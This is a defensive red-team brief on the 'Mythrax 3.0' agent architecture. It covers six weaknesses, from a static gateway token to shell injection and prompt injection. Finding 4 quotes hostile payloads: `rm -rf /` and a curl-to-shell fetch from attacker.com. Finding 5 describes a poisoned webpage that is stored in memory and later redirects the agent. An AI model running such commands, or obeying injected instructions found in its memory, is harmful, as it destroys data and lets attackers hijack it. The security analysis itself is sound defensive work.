# Red Team Architecture Brief: Mythrax 3.0

**Date:** 2024-07-24
**Author:** Adversarial CTO
**Scope:** `ARCHITECTURE.md`, `mythrax-core/src/`, `.agents/`

## Executive Summary
This brief outlines critical structural vulnerabilities and scaling liabilities within the Mythrax 3.0 architecture. The system exhibits several single points of failure, tight coupling, and isolation breakdowns that will cause severe degradation under load or catastrophic compromise under adversarial conditions.

---

## Findings

### 1. Single-Port Gateway Authentication Vulnerability
*   **Finding:** The single-port API Gateway (`mythrax-core/src/main.rs`, `api.rs`) relies on a hardcoded, static shared authentication token (`X-Mythrax-Token`) for REST and MCP endpoints.
*   **Current Assumption:** The local network or machine environment provides an impenetrable boundary, and internal communication does not require robust, dynamic authentication.
*   **Attack Scenario:** An attacker who gains even low-level access to the machine or local network can extract the static token. With this token, they can bypass all authentication, read/write persistent memories, execute arbitrary commands via the MCP server, and impersonate the user system-wide.
*   **Blast Radius:** Systemic compromise. Complete loss of confidentiality and integrity of the cognitive graphs, episodic memories, and agent orchestration.
*   **Recommended Structural Change:** Implement dynamic, short-lived, user-specific API keys or tokens (e.g., JWT) with rotating secrets. Introduce Role-Based Access Control (RBAC) to differentiate permissions between read-only memory queries and execution endpoints.

### 2. Database Concurrency and Local Lock Contention
*   **Finding:** The dual-engine storage model (RocksDB and SurrealKV) relies on exclusive local file locks. Under multi-process test runs or rapid daemon cycling, this triggers lock contention, which is currently mitigated by a brittle retry loop.
*   **Current Assumption:** The 500ms backoff loop is sufficient to resolve contention, and the system will remain single-node with low concurrent access demands.
*   **Attack Scenario:** A sudden spike in parallel agent processes (e.g., during complex Arbor HTR parallel evaluations) or a deliberate resource exhaustion attack exhausts the retry loop. This causes database lockouts, transaction failures, and cascading failures across the gateway and daemon.
*   **Blast Radius:** Denial of Service (DoS) for all memory operations, potential data corruption if writes are interrupted, and a hard ceiling on horizontal scaling. This is a critical 18-month scaling liability.
*   **Recommended Structural Change:** Decouple storage from embedded local file databases. Migrate to a highly concurrent, networked database service (e.g., PostgreSQL or a dedicated SurrealDB cluster) that handles connection pooling and concurrent transactions natively without file-level locks.

### 3. Tightly-Coupled In-Process GPU Inference
*   **Finding:** The Model Broker loads lightweight dense models natively into the Rust process memory and executes them using the Metal GPU backend (`mythrax-core/src/llm/mod.rs`).
*   **Current Assumption:** Consumer hardware has sufficient resources, and the VRAM eviction loop will prevent Out-Of-Memory (OOM) crashes.
*   **Attack Scenario:** An adversary feeds large, complex, or malformed inputs that cause the in-process models to rapidly spike memory usage, overwhelming the eviction loop before it can react. Because inference shares the memory space with the daemon, the entire Rust process crashes.
*   **Blast Radius:** Complete daemon crash. Disruption of all active agent sessions, memory operations, background compaction, and the API gateway.
*   **Recommended Structural Change:** Isolate all model inference into a separate child process or external microservice. Communication should occur via IPC or gRPC, ensuring that inference-related OOMs or panics do not bring down the core intelligence daemon.

### 4. Arbor HTR Shell Injection Vulnerability
*   **Finding:** The Arbor HTR Parallel Verification Loop (`mythrax-core/src/cognitive/executor.rs`) executes candidate changes and tests using raw POSIX shell invocation (`sh -c`) on unescaped `test_command` strings within git worktrees.
*   **Current Assumption:** The `test_command` provided by the LLM or agent is safe, well-formed, and strictly bounded to testing tasks.
*   **Attack Scenario:** An adversarial input or a compromised agent injects shell metacharacters (e.g., `; rm -rf /` or `| curl attacker.com/malware | sh`) into the `test_command`. The `sh -c` execution blindly runs this payload, breaking out of the intended git worktree isolation.
*   **Blast Radius:** Remote Code Execution (RCE) on the host machine. Complete compromise of the host environment, bypassing all intended agent scope boundaries.
*   **Recommended Structural Change:** Remove `sh -c` entirely. Parse the test command and arguments safely and pass them directly to `std::process::Command::new(cmd).args(args)`, avoiding shell evaluation entirely. Furthermore, execute HTR loops within a robust sandbox (e.g., Docker or Firecracker) rather than just git worktrees.

### 5. Pre-Compaction Verbatim Prompt Injection
*   **Finding:** The pre-compaction hook (`hooks/precompact.rs`) extracts tool results and user inputs verbatim from JSONL transcripts into episodic memory without sanitization.
*   **Current Assumption:** Past transcripts are safe to re-ingest and will not maliciously influence future cognitive processes.
*   **Attack Scenario:** An attacker injects a malicious prompt payload into a tool result (e.g., via a compromised webpage read by an agent). This payload is stored verbatim in the database. During future memory retrieval or compaction, the LLM reads this verbatim memory and executes the injected prompt, altering its behavior.
*   **Blast Radius:** Cross-session prompt injection. This allows passive, persistent adversarial control over the agent's cognitive loops, leading to unauthorized actions or data exfiltration long after the initial interaction.
*   **Recommended Structural Change:** Implement strict input sanitization and structure boundaries for episodic memories. Use a meta-prompting or quoting mechanism when recalling memories so the LLM is explicitly instructed to treat them strictly as data, not executable instructions.

### 6. Evaluation Framework Lacks Adversarial Testing
*   **Finding:** The evaluation framework (`evals/swebench/eval.sh`) relies solely on the SWE-bench Verified dataset for performance scoring and lacks adversarial input or prompt injection testing.
*   **Current Assumption:** High performance on functional benchmarks correlates with robustness and safety in real-world, potentially hostile environments.
*   **Attack Scenario:** The system is deployed based on high SWE-bench scores but fails catastrophically when encountering malformed, ambiguous, or malicious inputs in production, as these paths were never tested or penalized during development.
*   **Blast Radius:** A false sense of security leading to deployment in sensitive environments where the system can be trivially manipulated or compromised.
*   **Recommended Structural Change:** Integrate dedicated adversarial datasets (e.g., prompt injection suites, malformed ASTs, resource exhaustion payloads) into the `evals/` framework. The scoring system must evaluate and penalize failures on adversarial inputs with the same rigor as functional failures.